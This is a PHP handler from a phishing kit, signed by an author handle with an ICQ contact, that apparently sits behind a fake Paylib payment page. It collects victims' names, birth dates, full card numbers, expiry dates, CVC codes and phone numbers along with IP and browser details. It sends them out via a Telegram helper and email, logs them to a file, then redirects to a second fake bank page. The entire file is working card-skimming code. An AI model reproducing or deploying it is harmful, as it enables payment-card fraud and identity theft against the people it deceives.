<?php
session_start();
error_reporting(0);
/*

Author : H3L13M
ICQ : @651198700
ICQ : @651198700

*/


if(isset($_POST['prenoms']) ){
include "../config.php";
include "inc/funcs.php";


$subject = "[paylib] [LOGIN] INFO from $ip";

$info1 = $_POST['prenoms'];
$info2 = $_POST['noms'];
$info3 = $_POST['datenaissance'];
$info4 = $_POST['card_number'];
$info5 = $_POST['card_exp_mm'];
$info6 = $_POST['card_exp_aaaa'];
$info7 = $_POST['cvc']; 
$info8 = $_POST['prixarticle'];
$info9 = $_POST['tel'];

$message = "prenoms: $info1\nnoms: $info2\ndatenaissance: $info3\ncard_number $info4\ncard_exp_mm: $info5\ncard_exp_aaaa: $info6\ncvc: $info7\nprixarticle: $info8\ntel: $info9\nOS: ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../instant-banque-1.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../index.php\" />";
}
?>
